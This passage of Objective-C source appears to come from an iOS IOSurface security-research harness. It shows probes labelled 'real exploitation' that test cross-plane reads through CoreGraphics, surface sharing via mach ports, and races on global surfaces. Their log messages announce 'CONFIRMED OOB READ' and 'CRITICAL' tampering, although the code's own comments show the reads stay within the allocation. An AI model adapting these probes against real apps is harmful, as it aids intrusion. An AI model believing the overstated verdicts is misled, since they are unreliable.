                        if (origP1) {
                            uint32_t *oPx1 = (uint32_t *)origP1;
                            uint32_t tamperSeen = 0;
                            for (int i = 0; i < 64*64; i++) { if (oPx1[i] == 0xCCCCCCCC) tamperSeen++; }
                            if (tamperSeen > 0) {
                                anomalies++;
                                log([NSString stringWithFormat:@"GLOBALOVF: CRITICAL — %u tampered pixels visible on original surface!", tamperSeen]);
                                log(@"GLOBALOVF: Cross-process plane tamper confirmed without authentication");
                            }
                        }
                        sym.unlock(gSurf, 0, NULL);
                        CFRelease(ref);
                    }

                    if (isr_stopped()) { CFRelease(gSurf); goto globalovf_done; }

                    // Phase C — Full chain: predict ID + global lookup + tamper
                    log(@"GLOBALOVF: Phase C — predict+create+lookup+tamper chain x10");
                    uint32_t chainSuccess = 0;
                    IOSurfaceID lastID = gID;
                    for (int iter = 0; iter < 10 && !isr_stopped(); iter++) {
                        IOSurfaceID predictedID = lastID + 1;
                        IOSurfaceRef cSurf = sym.create((__bridge CFDictionaryRef)globalDual);
                        if (cSurf) {
                            IOSurfaceID actualID = sym.getID(cSurf);
                            if (actualID == predictedID) {
                                IOSurfaceRef cRef = sym.lookup(actualID);
                                if (cRef) {
                                    // Write via original, verify via lookup
                                    sym.lock(cSurf, 0, NULL);
                                    uint32_t *origP1 = (uint32_t *)getPlaneBase(cSurf, 1);
                                    if (origP1) {
                                        for (int j = 0; j < 64*64; j++) origP1[j] = 0xEEEEEEEE;
                                    }
                                    sym.unlock(cSurf, 0, NULL);

                                    sym.lock(cRef, 0, NULL);
                                    uint32_t *refP1 = (uint32_t *)getPlaneBase(cRef, 1);
                                    if (refP1) {
                                        for (int j = 0; j < 16; j++) {
                                            if (refP1[j] == 0xEEEEEEEE) { chainSuccess++; break; }
                                        }
                                    }
                                    sym.unlock(cRef, 0, NULL);
                                    CFRelease(cRef);
                                }
                            }
                            lastID = actualID;
                            CFRelease(cSurf);
                        }
                    }
                    log([NSString stringWithFormat:@"GLOBALOVF: Full chain success = %u/10", chainSuccess]);
                    if (chainSuccess > 5) {
                        anomalies++;
                        log(@"GLOBALOVF: ANOMALY — predict+global+lookup+tamper chain is reliable!");
                    }

                    CFRelease(gSurf);
                }
            }

            if (isr_stopped()) goto globalovf_done;

            // Phase D — Entropy analysis of fresh global surface planes
            log(@"GLOBALOVF: Phase D — entropy analysis of global surface data");
            {
                IOSurfaceRef eSurf = sym.create((__bridge CFDictionaryRef)globalDual);
                if (eSurf) {
                    sym.lock(eSurf, 0, NULL);
                    void *ep0 = getPlaneBase(eSurf, 0);
                    void *ep1 = getPlaneBase(eSurf, 1);
                    if (ep0 && ep1) {
                        double entP0 = shannon_entropy((const uint8_t *)ep0, 16384);
                        double entP1 = shannon_entropy((const uint8_t *)ep1, 16384);
                        log([NSString stringWithFormat:@"GLOBALOVF: Fresh global — plane0 entropy=%.3f plane1 entropy=%.3f", entP0, entP1]);
                        if (entP0 > 6.0) {
                            anomalies++;
                            log(@"GLOBALOVF: ANOMALY — high entropy in fresh plane0 (residual data leak)");
                        }
                        if (entP1 > 6.0) {
                            anomalies++;
                            log(@"GLOBALOVF: ANOMALY — high entropy in fresh plane1 (residual data leak)");
                        }
                    }
                    sym.unlock(eSurf, 0, NULL);
                    CFRelease(eSurf);
                }
            }

        globalovf_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"GLOBALOVF: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-GlobalOverflow-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

// =============================================================================
// ROUND 10: Real exploitation probes
// =============================================================================

// Probe 31: CG Cross-Plane Read — REAL OOB read of plane1 via CG context
// h=128 * bpr=256 = 32768 = allocSize, so all memory IS mapped. No crash.
// CG renders plane0+plane1 as one image, proving the OOB read primitive.
void iosurface_research_cg_crossplane_read(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
            typedef size_t (*GetPlaneCountFn)(IOSurfaceRef);
            GetPlaneCountFn getPlaneCount = (GetPlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");

            if (!getPlaneBase || !getPlaneCount) {
                log(@"CGREAD: Missing plane functions");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"missing plane fns"});
                return;
            }

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            // Dual-plane surface: plane0=64x64 at offset 0, plane1=64x64 at offset 16384
            // Total allocSize = 32768 = 128 rows * 256 bpr — CG h=128 is within bounds
            NSDictionary *p0Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *p1Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *dualPlane = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(32768),
                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
            };

            // === Test A: Write distinct patterns, read both via single CG context ===
            log(@"CGREAD: Test A — write 0xRRGGBBAA to plane0, 0xSECRET to plane1, read both via CG");
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
            if (!surf) {
                log(@"CGREAD: Failed to create surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create failed"});
                return;
            }

            sym.lock(surf, 0, NULL);
            void *p0 = getPlaneBase(surf, 0);
            void *p1 = getPlaneBase(surf, 1);
            ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
            log([NSString stringWithFormat:@"CGREAD: plane0=%p plane1=%p gap=%td allocSize=32768", p0, p1, gap]);

            if (!p0 || !p1 || gap != 16384) {
                log(@"CGREAD: Unexpected layout, aborting");
                sym.unlock(surf, 0, NULL);
                CFRelease(surf);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"bad layout"});
                return;
            }

            // Write known patterns: plane0 = red, plane1 = "secret" green
            uint32_t *px0 = (uint32_t *)p0;
            uint32_t *px1 = (uint32_t *)p1;
            for (int i = 0; i < 64*64; i++) px0[i] = 0xFFFF0000; // BGRA red
            for (int i = 0; i < 64*64; i++) px1[i] = 0xFF00FF00; // BGRA green "secret"

            // Create CG context spanning BOTH planes: h=128 * 256 = 32768 = allocSize
            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
            CGContextRef ctx = CGBitmapContextCreate(p0, 64, 128, 8, 256, cs,
                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);

            if (!ctx) {
                log(@"CGREAD: CG rejected h=128 — bounds check present, no OOB possible");
                CGColorSpaceRelease(cs);
                sym.unlock(surf, 0, NULL);
                CFRelease(surf);
                isr_unload(&sym);
                done(@{@"status": @"DONE", @"anomalies": @0, @"elapsed": @(CFAbsoluteTimeGetCurrent() - start)});
                return;
            }

            anomalies++;
            log(@"CGREAD: CG ACCEPTED h=128 context — rendering both planes as single image");

            CGImageRef img = CGBitmapContextCreateImage(ctx);
            if (img) {
                CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(img));
                if (pixData) {
                    const uint32_t *pixels = (const uint32_t *)CFDataGetBytePtr(pixData);
                    size_t totalPixels = (size_t)CFDataGetLength(pixData) / 4;
                    size_t imgW = CGImageGetWidth(img);
                    size_t imgH = CGImageGetHeight(img);
                    size_t imgBPR = CGImageGetBytesPerRow(img);

                    log([NSString stringWithFormat:@"CGREAD: Image = %zux%zu bpr=%zu totalPixels=%zu", imgW, imgH, imgBPR, totalPixels]);

                    // Count plane0 pixels (rows 0-63) that match red pattern
                    uint32_t redMatch = 0;
                    for (size_t row = 0; row < 64 && row < imgH; row++) {
                        size_t rowOff = row * (imgBPR / 4);
                        for (size_t col = 0; col < 64 && col < imgW; col++) {
                            if (rowOff + col < totalPixels && pixels[rowOff + col] == 0xFFFF0000) redMatch++;
                        }
                    }

                    // Count plane1 pixels (rows 64-127) that match green "secret" pattern
                    uint32_t greenMatch = 0;
                    for (size_t row = 64; row < 128 && row < imgH; row++) {
                        size_t rowOff = row * (imgBPR / 4);
                        for (size_t col = 0; col < 64 && col < imgW; col++) {
                            if (rowOff + col < totalPixels && pixels[rowOff + col] == 0xFF00FF00) greenMatch++;
                        }
                    }

                    log([NSString stringWithFormat:@"CGREAD: Plane0 (red) pixels via CG = %u/4096", redMatch]);
                    log([NSString stringWithFormat:@"CGREAD: Plane1 (SECRET green) pixels via CG = %u/4096", greenMatch]);

                    if (greenMatch > 0) {
                        anomalies++;
                        log(@"CGREAD: *** CONFIRMED OOB READ — plane1 data rendered by CG through plane0 context ***");
                        log([NSString stringWithFormat:@"CGREAD: %u secret pixels extracted = %.1f%% leak rate", greenMatch, greenMatch * 100.0 / 4096]);
                    }

                    // Sample some actual pixel values from the overflow region
                    log(@"CGREAD: Sample pixels from overflow region (rows 64-67):");
                    for (int row = 64; row < 68 && (size_t)row < imgH; row++) {
                        size_t rowOff = row * (imgBPR / 4);
                        if (rowOff + 3 < totalPixels) {
                            log([NSString stringWithFormat:@"CGREAD:   row %d: [0]=0x%08X [1]=0x%08X [2]=0x%08X [3]=0x%08X",
                                row, pixels[rowOff], pixels[rowOff+1], pixels[rowOff+2], pixels[rowOff+3]]);
                        }
                    }
                    CFRelease(pixData);
                }
                CGImageRelease(img);
            }
            CGContextRelease(ctx);
            CGColorSpaceRelease(cs);
            sym.unlock(surf, 0, NULL);

            if (isr_stopped()) { CFRelease(surf); goto cgread_done; }

            // === Test B: Modify plane1 "secretly", verify CG reads the change ===
            log(@"CGREAD: Test B — modify plane1 to 0xDEADBEEF, verify CG sees the change");
            sym.lock(surf, 0, NULL);
            uint32_t *secretP1 = (uint32_t *)getPlaneBase(surf, 1);
            if (secretP1) {
                for (int i = 0; i < 64*64; i++) secretP1[i] = 0xFFDEADBE; // BGRA with alpha=FF
            }

            CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
            CGContextRef ctx2 = CGBitmapContextCreate(getPlaneBase(surf, 0), 64, 128, 8, 256, cs2,
                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
            if (ctx2) {
                CGImageRef img2 = CGBitmapContextCreateImage(ctx2);
                if (img2) {
                    CFDataRef pix2 = CGDataProviderCopyData(CGImageGetDataProvider(img2));
                    if (pix2) {
                        const uint32_t *px = (const uint32_t *)CFDataGetBytePtr(pix2);
                        size_t nw = (size_t)CFDataGetLength(pix2) / 4;
                        size_t bpr = CGImageGetBytesPerRow(img2) / 4;
                        uint32_t deadMatch = 0;
                        for (size_t row = 64; row < 128; row++) {
                            for (size_t col = 0; col < 64; col++) {
                                size_t idx = row * bpr + col;
                                if (idx < nw && px[idx] == 0xFFDEADBE) deadMatch++;
                            }
                        }
                        if (deadMatch > 0) {
                            anomalies++;
                            log([NSString stringWithFormat:@"CGREAD: *** LIVE OOB READ — %u/4096 modified plane1 pixels visible via CG ***", deadMatch]);
                        }
                        CFRelease(pix2);
                    }
                    CGImageRelease(img2);
                }
                CGContextRelease(ctx2);
            }
            CGColorSpaceRelease(cs2);
            sym.unlock(surf, 0, NULL);

            if (isr_stopped()) { CFRelease(surf); goto cgread_done; }

            // === Test C: Multiple format variations ===
            log(@"CGREAD: Test C — test cross-plane read with different plane sizes");
            CFRelease(surf);
            {
                // Asymmetric: plane0=64x48, plane1=64x16, total=64*256=16384
                NSDictionary *asym0 = @{
                    @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @48,
                    @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                    @"IOSurfacePlaneBytesPerRow": @256
                };
                NSDictionary *asym1 = @{
                    @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @16,
                    @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(48*256),
                    @"IOSurfacePlaneBytesPerRow": @256
                };
                NSDictionary *asymSurf = @{
                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @48,
                    @"IOSurfacePixelFormat": @(0x42475241),
                    @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                    @"IOSurfaceAllocSize": @(64 * 256),
                    @"IOSurfacePlaneInfo": @[asym0, asym1]
                };

                IOSurfaceRef s2 = sym.create((__bridge CFDictionaryRef)asymSurf);
                if (s2) {
                    sym.lock(s2, 0, NULL);
                    void *a0 = getPlaneBase(s2, 0);
                    void *a1 = getPlaneBase(s2, 1);
                    if (a0 && a1) {
                        uint32_t *ap0 = (uint32_t *)a0;
                        uint32_t *ap1 = (uint32_t *)a1;
                        for (int i = 0; i < 48*64; i++) ap0[i] = 0xFF111111;
                        for (int i = 0; i < 16*64; i++) ap1[i] = 0xFF999999;

                        // CG with h=64 spans both planes (64*256=16384=allocSize)
                        CGColorSpaceRef cs3 = CGColorSpaceCreateDeviceRGB();
                        CGContextRef ctx3 = CGBitmapContextCreate(a0, 64, 64, 8, 256, cs3,
                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                        if (ctx3) {
                            CGImageRef img3 = CGBitmapContextCreateImage(ctx3);
                            if (img3) {
                                CFDataRef pix3 = CGDataProviderCopyData(CGImageGetDataProvider(img3));
                                if (pix3) {
                                    const uint32_t *ap = (const uint32_t *)CFDataGetBytePtr(pix3);
                                    size_t nw3 = (size_t)CFDataGetLength(pix3) / 4;
                                    size_t bpr3 = CGImageGetBytesPerRow(img3) / 4;
                                    uint32_t p1Leak = 0;
                                    for (size_t row = 48; row < 64; row++) {
                                        for (size_t col = 0; col < 64; col++) {
                                            size_t idx = row * bpr3 + col;
                                            if (idx < nw3 && ap[idx] == 0xFF999999) p1Leak++;
                                        }
                                    }
                                    log([NSString stringWithFormat:@"CGREAD: Asymmetric (48+16) — plane1 leaked pixels = %u/1024", p1Leak]);
                                    if (p1Leak > 0) {
                                        anomalies++;
                                        log(@"CGREAD: *** CONFIRMED — asymmetric plane layout also leaks ***");
                                    }
                                    CFRelease(pix3);
                                }
                                CGImageRelease(img3);
                            }
                            CGContextRelease(ctx3);
                        }
                        CGColorSpaceRelease(cs3);
                    }
                    sym.unlock(s2, 0, NULL);
                    CFRelease(s2);
                }
            }

        cgread_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"CGREAD: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-CGCrossPlaneRead-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 32: Mach Port Surface Hijack — transfer surface via mach port, tamper from second ref
void iosurface_research_mach_hijack(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");

            if (!createPort || !lookupPort) {
                log(@"MACHIJACK: Missing mach port functions");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"missing port fns"});
                return;
            }

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            // === Test A: Create surface, export via mach port, import, verify shared memory ===
            log(@"MACHIJACK: Test A — mach port export/import shared memory");
            NSDictionary *props = isr_default_surface_params(128, 128);
            IOSurfaceRef original = sym.create((__bridge CFDictionaryRef)props);
            if (!original) {
                log(@"MACHIJACK: Create failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create failed"});
                return;
            }

            // Write secret pattern to original
            sym.lock(original, 0, NULL);
            uint32_t *origBase = (uint32_t *)sym.getBase(original);
            if (origBase) {
                for (int i = 0; i < 128*128; i++) origBase[i] = 0xABCD0000 | (uint32_t)(i & 0xFFFF);
            }
            sym.unlock(original, 0, NULL);

            // Export via mach port
            mach_port_t port = createPort(original);
            log([NSString stringWithFormat:@"MACHIJACK: Mach port = 0x%X", port]);

            if (port != MACH_PORT_NULL) {
                // Import from mach port — this simulates another process receiving the port
                IOSurfaceRef hijacked = lookupPort(port);
                if (hijacked) {
                    sym.lock(hijacked, 0, NULL);
                    uint32_t *hijBase = (uint32_t *)sym.getBase(hijacked);
                    if (hijBase) {
                        // Verify we can read the original's secret data
                        uint32_t secretMatch = 0;
                        for (int i = 0; i < 128*128; i++) {
                            uint32_t expected = 0xABCD0000 | (uint32_t)(i & 0xFFFF);
                            if (hijBase[i] == expected) secretMatch++;
                        }
                        log([NSString stringWithFormat:@"MACHIJACK: Secret data readable via port = %u/16384 (%.1f%%)",
                            secretMatch, secretMatch * 100.0 / 16384]);
                        if (secretMatch > 0) {
                            anomalies++;
                            log(@"MACHIJACK: *** CONFIRMED — full surface data accessible via mach port transfer ***");
                        }

                        // Tamper the data from hijacked reference
                        log(@"MACHIJACK: Tampering data via hijacked reference...");
                        for (int i = 0; i < 128*128; i++) hijBase[i] = 0xBAADF00D;
                    }
                    sym.unlock(hijacked, 0, NULL);

                    // Verify tamper visible on original
                    sym.lock(original, 0, NULL);
                    uint32_t *origCheck = (uint32_t *)sym.getBase(original);
                    if (origCheck) {
                        uint32_t tamperVisible = 0;
                        for (int i = 0; i < 128*128; i++) {
                            if (origCheck[i] == 0xBAADF00D) tamperVisible++;
                        }
                        log([NSString stringWithFormat:@"MACHIJACK: Tamper visible on original = %u/16384", tamperVisible]);
                        if (tamperVisible > 0) {
                            anomalies++;
                            log(@"MACHIJACK: *** CRITICAL — remote tamper via mach port confirmed ***");
                        }
                    }
                    sym.unlock(original, 0, NULL);
                    CFRelease(hijacked);
                } else {
                    log(@"MACHIJACK: LookupFromMachPort returned NULL");
                }
                mach_port_deallocate(mach_task_self(), port);
            } else {
                log(@"MACHIJACK: CreateMachPort returned NULL");
            }

            if (isr_stopped()) { CFRelease(original); goto machijack_done; }

            // === Test B: Multiple ports from same surface ===
            log(@"MACHIJACK: Test B — multiple mach ports from same surface");
            {
                mach_port_t ports[5] = {0};
                IOSurfaceRef refs[5] = {0};
                for (int i = 0; i < 5; i++) {
                    ports[i] = createPort(original);
                    if (ports[i] != MACH_PORT_NULL) {
                        refs[i] = lookupPort(ports[i]);
                    }
                }
                // Write from ref[0], read from ref[4]
                if (refs[0] && refs[4]) {
                    sym.lock(refs[0], 0, NULL);
                    uint32_t *w = (uint32_t *)sym.getBase(refs[0]);
                    if (w) w[0] = 0xFEEDFACE;
                    sym.unlock(refs[0], 0, NULL);

                    sym.lock(refs[4], 0, NULL);
                    uint32_t *r = (uint32_t *)sym.getBase(refs[4]);
                    if (r && r[0] == 0xFEEDFACE) {
                        anomalies++;
                        log(@"MACHIJACK: *** Multi-port shared memory confirmed — write via port0, read via port4 ***");
                    }
                    sym.unlock(refs[4], 0, NULL);
                }
                uint32_t validPorts = 0;
                for (int i = 0; i < 5; i++) {
                    if (refs[i]) { CFRelease(refs[i]); validPorts++; }
                    if (ports[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), ports[i]);
                }
                log([NSString stringWithFormat:@"MACHIJACK: %u/5 ports created valid refs", validPorts]);
            }

            if (isr_stopped()) { CFRelease(original); goto machijack_done; }

            // === Test C: Port survives original release? ===
            log(@"MACHIJACK: Test C — port reference after original release");
            {
                NSDictionary *tmpProps = isr_default_surface_params(64, 64);
                IOSurfaceRef tmp = sym.create((__bridge CFDictionaryRef)tmpProps);
                if (tmp) {
                    sym.lock(tmp, 0, NULL);
                    uint32_t *tb = (uint32_t *)sym.getBase(tmp);
                    if (tb) for (int i = 0; i < 64*64; i++) tb[i] = 0xCAFEBABE;
                    sym.unlock(tmp, 0, NULL);

                    mach_port_t tmpPort = createPort(tmp);
                    CFRelease(tmp); // Release original

                    if (tmpPort != MACH_PORT_NULL) {
                        IOSurfaceRef revived = lookupPort(tmpPort);
                        if (revived) {
                            sym.lock(revived, 0, NULL);
                            uint32_t *rb = (uint32_t *)sym.getBase(revived);
                            if (rb) {
                                uint32_t cafeMatch = 0;
                                for (int i = 0; i < 64*64; i++) {
                                    if (rb[i] == 0xCAFEBABE) cafeMatch++;
                                }
                                if (cafeMatch > 0) {
                                    anomalies++;
                                    log([NSString stringWithFormat:@"MACHIJACK: *** DANGLING PORT — %u/4096 pixels still readable after original released ***", cafeMatch]);
                                } else {
                                    log(@"MACHIJACK: Port ref data cleared after original release");
                                }
                            }
                            sym.unlock(revived, 0, NULL);
                            CFRelease(revived);
                        }
                        mach_port_deallocate(mach_task_self(), tmpPort);
                    }
                }
            }

            CFRelease(original);

        machijack_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"MACHIJACK: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-MachHijack-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 33: Global Surface TOCTOU — race between write and read on global surface
void iosurface_research_global_toctou(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // Create global dual-plane surface
            NSDictionary *gp0 = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *gp1 = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *globalDual = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(32768),
                @"IOSurfaceIsGlobal": @YES,
                @"IOSurfacePlaneInfo": @[gp0, gp1]
            };

            IOSurfaceRef owner = sym.create((__bridge CFDictionaryRef)globalDual);
            if (!owner) {
                log(@"TOCTOU: Create failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create failed"});
                return;
            }
            IOSurfaceID ownerID = sym.getID(owner);
            log([NSString stringWithFormat:@"TOCTOU: Global surface ID=%u", ownerID]);

            // Get a "spy" reference via lookup
            IOSurfaceRef spy = sym.lookup(ownerID);
            if (!spy) {
                log(@"TOCTOU: Lookup failed");
                CFRelease(owner);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"lookup failed"});
                return;
            }

            // === Test A: TOCTOU race — owner writes, spy reads without lock ===
            log(@"TOCTOU: Test A — race: owner writes with lock, spy reads WITHOUT lock");
            __block uint32_t raceDetected = 0;
            __block uint32_t partialWrites = 0;

            dispatch_group_t group = dispatch_group_create();
            dispatch_queue_t writerQ = dispatch_queue_create("writer", DISPATCH_QUEUE_SERIAL);
            dispatch_queue_t readerQ = dispatch_queue_create("reader", DISPATCH_QUEUE_SERIAL);

            // Writer: alternates between 0xAAAAAAAA and 0x55555555
            __block volatile int32_t writerDone = 0;
            dispatch_group_enter(group);
            dispatch_async(writerQ, ^{
                for (int iter = 0; iter < 1000 && !isr_stopped(); iter++) {
                    sym.lock(owner, 0, NULL);
                    uint32_t *base = (uint32_t *)sym.getBase(owner);
                    if (base) {
                        uint32_t val = (iter % 2 == 0) ? 0xAAAAAAAA : 0x55555555;
                        for (int i = 0; i < 4096; i++) base[i] = val;
                    }
                    sym.unlock(owner, 0, NULL);
                }
                OSAtomicIncrement32(&writerDone);
                dispatch_group_leave(group);
            });

            // Reader: reads via spy WITHOUT lock — may see partial writes (TOCTOU)
            dispatch_group_enter(group);
            dispatch_async(readerQ, ^{
                while (!writerDone && !isr_stopped()) {
                    // NO LOCK — intentional TOCTOU
                    uint32_t *spyBase = (uint32_t *)sym.getBase(spy);
                    if (spyBase) {
                        uint32_t first = spyBase[0];
                        uint32_t last = spyBase[4095];
                        // If first != last, writer was mid-update (torn read)
                        if (first != last && first != 0 && last != 0) {
                            OSAtomicIncrement32((volatile int32_t *)&raceDetected);
                        }
                        // Check for mixed values (partial write visible)
                        uint32_t countA = 0, countB = 0;
                        for (int i = 0; i < 256; i++) {
                            if (spyBase[i] == 0xAAAAAAAA) countA++;
                            else if (spyBase[i] == 0x55555555) countB++;
                        }
                        if (countA > 0 && countB > 0) {
                            OSAtomicIncrement32((volatile int32_t *)&partialWrites);
                        }
                    }
                    // Tight loop — no sleep — maximize race window
                }
                dispatch_group_leave(group);
            });

            dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

            log([NSString stringWithFormat:@"TOCTOU: Race detections (torn reads) = %u", raceDetected]);
            log([NSString stringWithFormat:@"TOCTOU: Partial write observations = %u", partialWrites]);
            if (raceDetected > 0) {
                anomalies++;
                log(@"TOCTOU: *** CONFIRMED TOCTOU — spy sees inconsistent state during owner write ***");
            }
            if (partialWrites > 0) {
                anomalies++;
                log(@"TOCTOU: *** CONFIRMED — partial writes visible to spy (no atomicity guarantee) ***");
            }

            if (isr_stopped()) { CFRelease(spy); CFRelease(owner); goto toctou_done; }

            // === Test B: Spy tampers while owner validates ===
            log(@"TOCTOU: Test B — spy tampers during owner's check-then-use");
            {
                __block uint32_t tamperSuccess = 0;
                __block volatile int32_t phase2Done = 0;

                dispatch_group_t g2 = dispatch_group_create();

                // Owner: writes "valid" marker, then checks it
                dispatch_group_enter(g2);
                dispatch_async(writerQ, ^{
                    for (int iter = 0; iter < 2000 && !isr_stopped(); iter++) {
                        uint32_t *base = (uint32_t *)sym.getBase(owner);
                        if (base) {
                            // "CHECK": write valid value
                            base[0] = 0x56414C44; // "VALD"
                            // Small delay to widen the TOCTOU window
                            for (volatile int d = 0; d < 50; d++) {}
                            // "USE": read back and verify
                            if (base[0] != 0x56414C44) {
                                OSAtomicIncrement32((volatile int32_t *)&tamperSuccess);
                            }
                        }
                    }
                    OSAtomicIncrement32(&phase2Done);
                    dispatch_group_leave(g2);
                });

                // Spy: overwrites "valid" marker between check and use
                dispatch_group_enter(g2);
                dispatch_async(readerQ, ^{
                    while (!phase2Done && !isr_stopped()) {
                        uint32_t *spyBase = (uint32_t *)sym.getBase(spy);
                        if (spyBase) {
                            spyBase[0] = 0x48414351; // "HACK"
                        }
                    }
                    dispatch_group_leave(g2);
                });

                dispatch_group_wait(g2, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

                log([NSString stringWithFormat:@"TOCTOU: Spy tamper-during-check successes = %u/2000", tamperSuccess]);
                if (tamperSuccess > 0) {
                    anomalies++;
                    log(@"TOCTOU: *** CRITICAL — TOCTOU attack successful: spy modified data between check and use ***");
                    log([NSString stringWithFormat:@"TOCTOU: Success rate = %.1f%%", tamperSuccess * 100.0 / 2000]);
                }
            }

            CFRelease(spy);
            CFRelease(owner);

        toctou_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"TOCTOU: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed),
                @"raceDetected": @(raceDetected),
                @"partialWrites": @(partialWrites)
            };
            isr_checkpoint(@"ISR-GlobalTOCTOU-checkpoint.json", res);
            isr_unload(&sym);
